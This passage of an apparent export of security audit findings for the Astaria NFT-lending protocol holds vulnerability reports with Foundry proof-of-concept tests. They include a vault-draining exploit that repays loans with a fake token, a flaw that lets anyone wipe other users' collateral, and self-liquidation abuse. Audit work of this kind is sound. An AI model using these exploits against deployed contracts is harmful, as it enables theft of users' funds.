= 50 ether; // amount to borrow             IAstariaRouter.Commitment memory c = _generateValidTerms({       vault: privateVault,       strategist: strategistOne,       strategistPK: strategistOnePK,       tokenContract: tokenContract,       tokenId: 1,       lienDetails: lienDetails,       amount: amount,       stack: new ILienToken.Stack[](0)     });      // Attack starts here     // The borrower an asset which has no value in the market     MockERC20 FakeToken = new MockERC20(\"USDC\", \"FakeAsset\", 18); // this could be any ERC token created by the attacker     FakeToken.mint(address(this),500 ether);     // The borrower creates a private vault with his/her asset     address privateVaultOfBorrower = __createPrivateVault({       strategist: address(this),       delegate: address(0),       token: address(FakeToken)     });      uint8 i;     for( ; i < 10 ; i ++) {       // Here is the exploit: commitToLien on privateVault while passing differentVault in the strategy       c.lienRequest.strategy.vault = privateVaultOfBorrower;          (uint256 lienId, ILienToken.Stack[] memory stack , uint256 payout) = IVaultImplementation(privateVault).commitToLien(           c,           address(this)       );       console.log(\"Take 50 ether loan#%d\", (i+1));        // necessary approvals       FakeToken.approve(address(TRANSFER_PROXY), amount);       FakeToken.approve(address(LIEN_TOKEN), amount);        // pay the loan with FakeToken        ILienToken.Stack[] memory newStack = LIEN_TOKEN.makePayment(         stack[0].lien.collateralId,         stack,         uint8(0),         amount       );       console.log(\"Repay 50 FakeToken loan#%d\", (i+1));     }       // assertion     console.log(\"------\");     // Vault is drained     console.log(\"PrivateVault Balance: %d WETH\", WETH9.balanceOf(privateVault));     assertEq(WETH9.balanceOf(privateVault), 0);      // The borrower gets 500 ether     console.log(\"Borrower Balance: %d WETH\", WETH9.balanceOf(address(this)));     assertEq(WETH9.balanceOf(address(this)), initialBalance + 500 ether);     // strategist receives the fake token     console.log(\"Strategist Balance: %d FakeToken\", FakeToken.balanceOf(strategistOne));     assertEq(FakeToken.balanceOf(strategistOne), 500 ether);    }   }   ```  3. Then run the forge test command as follows (replace $FORK_URL with your RPC URL):   ```sh  forge test --ffi --fork-url $FORK_URL --fork-block-number 15934974 --match-path src/test/StealAllFundsExploit.t.sol -vv ```   The test will pass. I've added comments in the code explaining the steps.  *Note:The attack isn't possible when using AstariaRouter*   ## Tools Used Manual analysis  ## Recommended Mitigation Steps  In VaultImplementation's  `commitToLien`  function, add the following validation: ```sh require(address(this) == params.lienRequest.strategy.vault,\"INVALID VAULT\"); ```  Run the PoC test above again, and `testPayWithDifferentAsset` should fail."}, {"title": "At the second time the nft is used as collateral to take a loan, the debt repayment via auction fund can be failed when liquidation ", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/379", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-09"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143-L146   # Vulnerability details  ## Proof of concept  When a user transfer an NFT to `CollateralToken` contract, it will toggle the function `CollateralToken.onERC721Received()`. In this function if there didn't exist any `clearingHouse` for the `collateralId`, it will create a new one for that collateral.  ```solidity= if (s.clearingHouse[collateralId] == address(0)) {     address clearingHouse = ClonesWithImmutableArgs.clone(       s.ASTARIA_ROUTER.BEACON_PROXY_IMPLEMENTATION(),       abi.encodePacked(         address(s.ASTARIA_ROUTER),         uint8(IAstariaRouter.ImplementationType.ClearingHouse),         collateralId       )     );      s.clearingHouse[collateralId] = clearingHouse;   } ``` The interesting thing of this technique is: there will be **just one `clearingHouse`** be used for each collateral no matter how many times the collateral is transferred to the contract. Even when the lien is liquidated / fully repayed, the `s.clearingHouse[collateralId]` remain unchanged.   The question here is any stale datas in `clearingHouse` from the previous time that the nft was used as collateral can affect the behavior of protocol when the nft was transfered to CollateralToken again ?  Let take a look at the function [`ClearingHouse._execute()`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114). In this function, the implementation uses `safeApprove()` to approve `payment - liquidatorPayment` amount for the `TRANSFER_PROXY`.  ```solidity= ERC20(paymentToken).safeApprove(   address(ASTARIA_ROUTER.TRANSFER_PROXY()),   payment - liquidatorPayment ); ``` the `safeApprove` function will revert if the allowance was set from non-zero value to non-zero value. This will incur some potential risk for the function like example below:  1. NFT x is transferred to `CollateralToken` to take loans and then it is liquidated. 2. At time 10, function `ClearingHouse._execute()` was called and the `payment - liquidatorPayment > totalDebt`. This will the `paymentToken.allowance[clearingHouse][TRANSFER_PROXY] > 0` after the function ended.  3. NFT x is transferred to `CollateralToken` for the second time to take a loans and then it is liquidated again.  4. At time 15 (> 10), function `ClearingHouse._execute()` was called, but at this time, the `safeApprove` will revert since the previous allowance is different from 0   ## Impact The debt can be repayed by auction funds when liquidation.  ## Tools Used Manual review     ## Recommended Mitigation Steps Consider to use `approve` instead of `safeApprove`."}, {"title": "Liquidation will fail if value set as `liquidationInitialAsk` > 2**88-1, causing collateral to be permanently locked", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/375", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-10"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L340   # Vulnerability details  ##### Description:  When a lien is initially created, the `liquidationInitialAsk` can be set as any uint256 value >= the amount of underlying borrowed. Later on however, if the position is liquidated, an auction is created which casts the `liquidationInitialAsk` value to a uint88. Taking a look at the function in `SafeCastLib.sol`, we can see that if the value is greater than the max uint88 value, execution is reverted:  ``` function safeCastTo88(uint256 x) internal pure returns (uint88 y) {   require(x < 1 << 88);    y = uint88(x); } ```  This reversion prevents auctions from ever being initialized, and since the only way to retrieve the collateral after the loan has expired is through auction, the collateral is permanently locked in the contract.  For reference, setting the `initialLiquidationAsk` > 309,485,009.8213451 DAI would trigger this error, and with a lesser value or higher decimal collateral, this may require a much lower USD equivalent. Additionally, setting a price this high is not particularly unrealistic considering it's the starting price for a dutch auction in which it should be intentionally priced much higher than it's worth.  ##### Proof of Concept:  We can create the following test in `AstariaTest.t.sol` to verify:  ``` function testCannotLiquidateTooHighInitialAsk() public {   TestNFT nft = new TestNFT(3);   vm.label(address(nft), \"nft\");   address tokenContract = address(nft);   uint256 tokenId = uint256(1);   address publicVault = _createPublicVault({     strategist: strategistOne,     delegate: strategistTwo,     epochLength: 14 days   });    _lendToVault(     Lender({addr: address(1), amountToLend: 50 ether}),     publicVault   );    uint256 vaultTokenBalance = IERC20(publicVault).balanceOf(address(1));   ILienToken.Stack[] memory stack;   (, stack) = _commitToLien({     vault: publicVault,     strategist: strategistOne,     strategistPK: strategistOnePK,     tokenContract: tokenContract,     tokenId: tokenId,     lienDetails: ILienToken.Details({       maxAmount: 50 ether,       rate: (uint256(1e16) * 150) / (365 days),       duration: 10 days,       maxPotentialDebt: 0 ether,       liquidationInitialAsk: type(uint256).max     }),     amount: 5 ether,     isFirstLien: true   });    uint256 collateralId = tokenContract.computeId(tokenId);    skip(14 days); // end of loan   vm.expectRevert();   OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(     stack,     uint8(0)   ); } ```  ##### Remediation:  This can be avoided by using a uint256 as the `auctionData.startAmount`."}, {"title": "minDepositAmount is unnecessarily high, can price out many users", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/367", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-14"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L96-L108   # Vulnerability details  ## Impact The `minDepositAmount()` function is intended to ensure that all depositors into Public Vaults are depositing more than dust to protect against attacks like the 4626 front running attack. It is calculated as follows:  ```   function minDepositAmount()     public     view     virtual     override(ERC4626Cloned)     returns (uint256)   {     if (ERC20(asset()).decimals() == uint8(18)) {       return 100 gwei;     } else {       return 10**(ERC20(asset()).decimals() - 1);     }   } ``` For assets with 18 decimals, this calculation is totally reasonable, as the minimum deposit is just 100 gwei (1/10k of a USD). However, for other assets, the formula returns 0.1 tokens, regardless of value.  While this may be fine for low-priced tokens, it leads to a minimum deposit for tokens like WBTC to be over $2000 USD, certainly too high for many user and not aligned with the intended behavior (which can be seen in the 18 decimal base case).  ## Proof of Concept  - WBTC is 8 decimals and has a value of ~$20k USD - the minimum deposit is calculated as `return 10**(ERC20(asset()).decimals() - 1);` - for WBTC, this would return 10 ** 7 - `20,000 * (10 ** 7) / (10 ** 8)` = `2000 USD`  This is far out of line with the `1/10,000 USD` expected for tokens with 18 decimals.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Since our requirements for the size of deposit are so low, we can customize a formula that ensures we get a small final result in all cases. For example:  ``` if (ERC20(asset()).decimals() < 4) {     return 10**(ERC20(asset()).decimals() - 1); else if (ERC20(asset()).decimals() < 8) {     return 10**(ERC20(asset()).decimals() - 2); } else {     return 10**(ERC20(asset()).decimals() - 6); } ```"}, {"title": "Overflow potential in processEpoch()", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/362", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-15"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L321-L337   # Vulnerability details  ## Impact In `PublicVault.sol#processEpoch()`, we update the withdraw reserves based on how `totalAssets()` (the real amount of the underlying asset held by the vault) compares to the expected value in the withdraw proxy:  ```   unchecked {     if (totalAssets() > expected) {       s.withdrawReserve = (totalAssets() - expected)         .mulWadDown(s.liquidationWithdrawRatio)         .safeCastTo88();     } else {       s.withdrawReserve = 0;     }   } ``` In the event that the `totalAssets()` is greater than expected, we take the surplus in assets multiply it by the withdraw ratio, and assign this value to `s.withdrawReserve`.  However, because this logic is wrapped in an `unchecked` block, it must have confidence that this calculation does not overflow. Because the protocol allows arbitrary ERC20s to be used, it can't have confidence in the size of `totalAssets()`, which opens up the possibility for an overflow in this function.   ## Proof of Concept  `mulWadDown` is calculated by first multiplying the two values, and then dividing by `1e18`. This is intended to prevent rounding errors with the division, but also means that an overflow is possible when the two values have been multiplied, before any division has taken place.  This unchecked block is safe from overflows if: - `(totalAssets() - expected) * s.liquidationWithdrawRatio < 1e88` (because s.withdrawRatio is 88 bytes) - `liquidationWithdrawRatio` is represented as a ratio of WAD, so it will be in the `1e17` - `1e18` range, let's assume `1e17` to be safe - therefore we require `totalAssets() - expected < 1e61`  Although this is unlikely with most tokens (and certainly would have been safe in the previous iteration of the protocol that only used `WETH`, when allowing arbitrary ERC20 tokens, this is a risk.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Remove the `unchecked` block around this calculation, or add an explicitly clause to handle the situation where `totalAssets()` gets too large for the current logic."}, {"title": "INCORRECT BLOCKHASH USAGE LEADS TO ZERO Value of Salt", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/332", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-33"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/main/src/CollateralToken.sol#L471   # Vulnerability details  ## Impact `blockhash()` is used to return the hash of the given block. This only works for the 256 most recent blocks, excluding the current block. it always returns 0 for the current block, i.e. `blockhash(block. Number)` always equals 0.  ## Proof of Concept Vulnerable line of code: - https://github.com/code-423n4/2023-01-astaria/blob/main/src/CollateralToken.sol#L471  Screenshot for the PoC : - https://drive.google.com/file/d/1o_BD2RKrUysYxncNKH2IOdJvG3w__y4L/view?usp=share_link  ## Tools Used Manual  ## Recommended Mitigation Steps Use the blockhash function only for the last 256 blocks. For example: `blockhash(block.number-1)`"}, {"title": "Forget to update storage when call `LienToken.stopLiens()`", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/325", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-34"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L292-L346   # Vulnerability details  ## Vulnerability Detail When an collateral nft is liquidated, function `LienToken.stopLiens()` will be called to stop accruring interest for all lien against that collateral.  This function will loop through all the liens in the stack to calculate the current `amountOwed` and prepare the data for the auction (`startTime`, `endTime`, `startAmount`, `endAmount`). All of this informations will be stored memory variable `auctionData`. ```solidity=   function _stopLiens(     LienStorage storage s,     uint256 collateralId,     uint256 auctionWindow,     Stack[] calldata stack,     address liquidator   ) internal {     /// [#explain] data will be stored in this memory variable      AuctionData memory auctionData;     auctionData.liquidator = liquidator;     auctionData.stack = new AuctionStack[](stack.length);     s.auctionData[collateralId].liquidator = liquidator;          uint256 i;     for (; i < stack.length; ) {       AuctionStack memory auctionStack;        /// [#explain] calculate the data for auctionStack        auctionStack.lienId = stack[i].point.lienId;       auctionStack.end = stack[i].point.end;       uint88 owed = _getOwed(stack[i], block.timestamp);       auctionStack.amountOwed = owed;       s.lienMeta[auctionStack.lienId].atLiquidation = true;       auctionData.stack[i] = auctionStack;                /// ...                 unchecked {         ++i;       }     }            /// [#explain] prepare data for auction here      s.collateralStateHash[collateralId] = ACTIVE_AUCTION;     auctionData.startTime = block.timestamp.safeCastTo48();     auctionData.endTime = (block.timestamp + auctionWindow).safeCastTo48();     auctionData.startAmount = stack[0]       .lien       .details       .liquidationInitialAsk       .safeCastTo88();     auctionData.endAmount = uint88(1000 wei);         /// [#explain] update auction data in clearing house      s.COLLATERAL_TOKEN.getClearingHouse(collateralId).setAuctionData(       auctionData     );   } ``` Unfortunately after storing the data into memory variable, function forgot to assign it into storage `s.auctionData[collateralId]`, it just updated this in `clearingHouse` contract.  This will make function `LienToken.getAuctionData()`, `LienToken.getAmountOwingAtLiquidation()` return a wrong data. This will make users who want to integrate with protocol confuse and cause some potential risk.  ## Impact Wrong return value from function  ## Tool used Manual Review  ## Recommendation Update the storage value after calculate the memory `auctionData`.  "}, {"title": "Public vault owner (strategist) can use buyoutLien to indefinitely prevent liquidity providers from withdrawing", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/324", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-18"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L313-L351   # Vulnerability details  ## Impact By calling buyoutLien before transferWithdrawReserve() is invoked (front-run if necessary), Public vault owner (strategist) can indefinitely prevent liquidity providers from withdrawing. He now effectively owns all the fund in the public vault.  ## Proof of Concept https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L295 https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L421 Before commitLien, transferWithdrawReserve() is invoked to transfer available funds from the public vault to the withdrawProxy of the previous epoch. However, this is not the case for buyoutLien.  https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L372-L382 As soon as there's fund is available in the vault, the strategist can call buyoutLien before any calls to transferWithdrawReserve(), and the withdrawProxy will need to continue to wait for available fund. The only thing that can break this cycle is a liquidation, but the strategist can prevent this from happening by only buying out liens from vaults he control where he only lends out to himself.  Consider the following test. Even though there is enough fund in the vault for the liquidity provider's withdrawal (60 ether), only less than 20 ethers ended up in the withdrawProxy when transferWithdrawReserve() is preceeded by buyoutLien(). ``` pragma solidity =0.8.17;  import \"forge-std/Test.sol\";  import {Authority} from \"solmate/auth/Auth.sol\"; import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\"; import {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\"; import {   MultiRolesAuthority } from \"solmate/auth/authorities/MultiRolesAuthority.sol\";  import {ERC721} from \"gpl/ERC721.sol\"; import {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";  import {IAstariaRouter, AstariaRouter} from \"../AstariaRouter.sol\"; import {VaultImplementation} from \"../VaultImplementation.sol\"; import {PublicVault} from \"../PublicVault.sol\"; import {TransferProxy} from \"../TransferProxy.sol\"; import {WithdrawProxy} from \"../WithdrawProxy.sol\";  import {Strings2} from \"./utils/Strings2.sol\";  import \"./TestHelpers.t.sol\"; import {OrderParameters} from \"seaport/lib/ConsiderationStructs.sol\";  contract AstariaTest is TestHelpers {   using FixedPointMathLib for uint256;   using CollateralLookup for address;   using SafeCastLib for uint256;    event NonceUpdated(uint256 nonce);   event VaultShutdown();    function testBuyoutBeforeWithdraw() public {     TestNFT nft = new TestNFT(1);     address tokenContract = address(nft);     uint256 tokenId = uint256(0);      address publicVault = _createPublicVault({       strategist: strategistOne,       delegate: strategistTwo,       epochLength: 7 days     });     _lendToVault(       Lender({addr: address(1), amountToLend: 60 ether}),       publicVault     );      address publicVault2 = _createPublicVault({       strategist: strategistOne,       delegate: strategistTwo,       epochLength: 7 days     });     _lendToVault(       Lender({addr: address(1), amountToLend: 60 ether}),       publicVault2     );      (, ILienToken.Stack[] memory stack) = _commitToLien({       vault: publicVault,       strategist: strategistOne,       strategistPK: strategistOnePK,       tokenContract: tokenContract,       tokenId: tokenId,       lienDetails: standardLienDetails,       amount: 40 ether,       isFirstLien: true     });      vm.warp(block.timestamp + 3 days);      IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({       vault: publicVault2,       strategist: strategistOne,       strategistPK: strategistOnePK,       tokenContract: tokenContract,       tokenId: tokenId,       lienDetails: ILienToken.Details({         maxAmount: 50 ether,         rate: (uint256(1e16) * 70) / (365 days),         duration: 25 days,         maxPotentialDebt: 53 ether,         liquidationInitialAsk: 500 ether       }),       amount: 10 ether,       stack: stack     });      _signalWithdraw(address(1), publicVault2);     _warpToEpochEnd(publicVault2);     PublicVault(publicVault2).processEpoch();           VaultImplementation(publicVault2).buyoutLien(       stack,       uint8(0),       refinanceTerms     );           PublicVault(publicVault2).transferWithdrawReserve();      WithdrawProxy withdrawProxy = PublicVault(publicVault2).getWithdrawProxy(0);      assertTrue(WETH9.balanceOf(address(withdrawProxy)) < 20 ether);        } } ```  ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps Enforce a call to transferWithdrawReserve() before a buyout executes (similar to commitLien)"}, {"title": "Borrower can use liquidationInitialAsk to block future borrowers", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/289", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-12"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L471-L489 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L153-L174   # Vulnerability details  ## Impact When a new lien is taken (or bought out), one of the validations is to ensure that the `potentialDebt` of each borrower on the stack is less than or equal to their `liquidationInitialAsk`.  ``` if (potentialDebt > newStack[j].lien.details.liquidationInitialAsk) {     revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);   } ```  In `_appendStack()` and `_buyoutLien()`, this is performed by iterating through the stack backwards, totaling up the `potentialDebt`, and comparing it to each lien's `liquidationInitialAsk`:  ``` for (uint256 i = stack.length; i > 0; ) {       uint256 j = i - 1;       newStack[j] = stack[j];       if (block.timestamp >= newStack[j].point.end) {         revert InvalidState(InvalidStates.EXPIRED_LIEN);       }       unchecked {         potentialDebt += _getOwed(newStack[j], newStack[j].point.end);       }       if (potentialDebt > newStack[j].lien.details.liquidationInitialAsk) {         revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);       }        unchecked {         --i;       }     } ``` However, only the first item on the stack has a `liquidationInitialAsk` that matters. When a new auction is started on Seaport, `Router#liquidate()` uses `stack[0].lien.details.liquidationInitialAsk` as the starting price. The other values are meaningless, except in their ability to DOS future borrowers.  ## Proof of Concept  - I set my `liquidationInitialAsk` to be exactly the value of my loan - A borrower has already borrowed on their collateral, and the first loan on the stack will determine the auction price - When they borrow from me, my `liquidationInitialAsk` is recorded - Any future borrows will check that `futureBorrow + myBorrow <= myLiquidationInitialAsk`, which is not possible for any `futureBorrow > 0` - The result is that the borrower will be DOS'd from all future borrows  This is made worse by the fact that `liquidationInitialAsk` is not a variable that can justify a refinance, so they'll need to either pay back the loan or find a refinancier who will beat one of the other terms (rate or duration) in order to get rid of this burden.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Get rid of all checks on `liquidationInitialAsk` except for comparing the total potential debt of the entire stack to the `liquidationInitialAsk` of the lien at position 0."}, {"title": "Anyone can wipe complete state of any collateral at any point", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/287", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-13"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114-L167 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L545 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L497-L510 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L623-L656   # Vulnerability details  ## Impact The Clearing House is implemented as an ERC1155. This is used to settle up at the end of an auction. The Clearing House's token is listed as one of the Consideration Items, and when Seaport goes to transfer it, it triggers the settlement process.   This settlement process includes deleting the collateral state hash from LienToken.sol, burning all lien tokens, deleting the idToUnderlying mapping, and burning the collateral token. **These changes effectively wipe out all record of the liens, as well as removing any claim the borrower has on their underlying collateral.**  After an auction, this works as intended. The function verifies that sufficient payment has been made to meet the auction criteria, and therefore all these variables should be zeroed out.   However, the issue is that there is no check that this safeTransferFrom function is being called after an auction has completed. In the case that it is called when there is no auction, all the auction criteria will be set to 0, and therefore the above deletions can be performed with a payment of 0.  This allows any user to call the `safeTransferFrom()` function for any other user's collateral. This will wipe out all the liens on that collateral, and burn the borrower's collateral token, and with it their ability to ever reclaim their collateral.   ## Proof of Concept  The flow is as follows: - safeTransferFrom(offerer, buyer, paymentToken, amount, data) - _execute(offerer, buyer, paymentToken, amount) - using the auctionStack in storage, it calculates the amount the auction would currently be listed at - it confirms that the Clearing House has already received sufficient paymentTokens for this amount - it then transfers the liquidator their payment (currently 13%) - it calls `LienToken#payDebtViaClearingHouse()`, which pays back all liens, zeros out all lien storage and deletes the collateralStateHash - if there is any remaining balance of paymentToken, it transfers it to the owner of the collateral - it then calls `Collateral#settleAuction()`, which deletes idToUnderlying, collateralIdToAuction and burns the collateral token  In the case where the auction hasn't started, the `auctionStack` in storage is all set to zero. When it calculates the payment that should be made, it uses `_locateCurrentAmount`, which simply returns `endAmount` if `startAmount == endAmount`. In the case where they are all 0, this returns 0.  The second check that should catch this occurs in `settleAuction()`:  ```     if (       s.collateralIdToAuction[collateralId] == bytes32(0) &&       ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(         s.idToUnderlying[collateralId].tokenId       ) !=       s.clearingHouse[collateralId]     ) {       revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);     } ```  However, this check accidentally uses an `&&` operator instead of a `||`. The result is that, even if the auction hasn't started, only the first criteria is false. The second is checking whether the Clearing House owns the underlying collateral, which happens as soon as the collateral is deposited in `CollateralToken.sol#onERC721Received()`:  ```       ERC721(msg.sender).safeTransferFrom(         address(this),         s.clearingHouse[collateralId],         tokenId_       ); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Change the check in `settleAuction()` from an AND to an OR, which will block any collateralId that isn't currently at auction from being settled:   ```     if (       s.collateralIdToAuction[collateralId] == bytes32(0) ||       ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(         s.idToUnderlying[collateralId].tokenId       ) !=       s.clearingHouse[collateralId]     ) {       revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);     } ```"}, {"title": "Users are forced to approve Router for full collection to use commitToLiens() function", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/283", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-19"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L780-L785 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L287-L306 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L233-L244   # Vulnerability details  ## Impact When a user calls Router#commitToLiens(), the Router calls `commitToLien()`. The comments specify:  `//router must be approved for the collateral to take a loan,`  However, the Router being approved isn't enough. It must be approved for all, which is a level of approvals that many users are not comfortable with. This is because, when the commitment is validated, it is checked as follows:  ```     uint256 collateralId = params.tokenContract.computeId(params.tokenId);     ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));     address holder = CT.ownerOf(collateralId);     address operator = CT.getApproved(collateralId);     if (       msg.sender != holder &&       receiver != holder &&       receiver != operator &&       !CT.isApprovedForAll(holder, msg.sender)     ) {       revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);     } ```  ## Proof of Concept  The check above allows the following situations pass: - caller of the function == owner of the NFT - receiver of the loan == owner of the NFT - receiver of the loan == address approved for the individual NFT - caller of the function == address approved for all  This is inconsistent and doesn't make much sense. The approved users should have the same permissions.   More importantly, the most common flow (that the address approved for the individual NFT \u2014\u00a0the Router \u2014\u00a0is the caller) does not work and will lead to the function reverting.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Change the check to include `msg.sender != operator` rather than `receiver != operator`."}, {"title": "Auction Window automatically includes Buffer and doesn't serve any purpose", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/282", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L621-L648   # Vulnerability details  ## Impact There are two values saved in Router storage for auctions: auctionWindow and auctionWindowBuffer. It appears these are intended to be a base auction length and an additional buffer that is used in some circumstances.  However, the protocol never uses these values. Instead, the `liquidate()` function adds them together and only uses that summed value for everything the protocol needs, ignoring the two separate values.  ## Proof of Concept  The `liquidate()` function uses the following formula to sum the two values:   `uint256 auctionWindowMax = s.auctionWindow + s.auctionWindowBuffer;`  From then on, this `auctionWindowMax` value is the only time that is used (to adjust epoch expectations, set up withdrawal proxies, set up the Seaport auction, etc).  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  If there is an intention to have these two values perform some function, implement it. Otherwise, combine them into one joined value for `auctionLength`."}, {"title": "Users can liquidate themselves before others, allowing them to take 13% above their borrowers", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/281", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-20"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L611-L619   # Vulnerability details  ## Impact The `canLiquidate()` function allows liquidations to take place if either (a) the loan is over and still exists or (b) the caller owns the collateral.  In the second case, due to the liquidation fee (currently 13%), this can give a borrower an unfair position to be able to reclaim a percentage of the liquidation that should be going to their lenders.  ## Proof of Concept - A borrower puts up a piece of collateral and takes a loan of 10 WETH - The collateral depreciates in value and they decide to keep the 10 WETH - Right before the loans expire, the borrower can call `liquidate()` themselves - This sets them as the `liquidator` and gives them the first 13% return on the auction - While the lenders are left at a loss, the borrower gets to keep the 10 WETH and get a 1.3 WETH bonus  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Don't allow users to liquidate their own loans until they are liquidatable by the public."}, {"title": "A malicious private vault can preempt the creation of a public vault by transferring lien tokens to the public vault, thereby preventing the borrower from repaying all loans", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/246", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-14"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L360-L375   # Vulnerability details  ## Impact In LienToken.transferFrom, transferring lien tokens to the public vault is prohibited because variables such as liensOpenForEpoch are not updated when the public vault receives a lien token, which would prevent the borrower from repaying the loan in that lien token. ```solidity   function transferFrom(     address from,     address to,     uint256 id   ) public override(ERC721, IERC721) {     LienStorage storage s = _loadLienStorageSlot();     if (_isPublicVault(s, to)) {       revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);     }     if (s.lienMeta[id].atLiquidation) {       revert InvalidState(InvalidStates.COLLATERAL_AUCTION);     }     delete s.lienMeta[id].payee;     emit PayeeChanged(id, address(0));     super.transferFrom(from, to, id);   } ``` However, public vaults are created using the ClonesWithImmutableArgs.clone function, which uses the `create` opcode, which allows the address of the public vault to be predicted before it is created.  https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed ```solidity             assembly {                 instance := create(0, ptr, creationSize)             } ``` This allows a malicious private vault to transfer lien tokens to the predicted public vault address in advance, and then call AstariaRouter.newPublicVault to create the public vault, which 